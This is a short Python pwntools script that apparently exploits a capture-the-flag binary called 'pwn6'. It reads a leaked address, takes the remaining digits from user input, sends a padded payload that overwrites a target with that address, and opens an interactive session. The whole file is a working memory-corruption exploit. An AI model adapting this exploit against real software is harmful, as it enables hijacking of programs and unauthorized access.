from pwn import *
import struct
context.bits = 64
r = process('./pwn6')
addressOutput = r.recvline()
address = addressOutput.split(':')[1].strip()
print address
address = address[:-3]
address += raw_input()
address = int(address,16)
print address
padding = 0xc - 0x8
payload = fit({padding:address})
r.sendline(payload)
r.interactive()

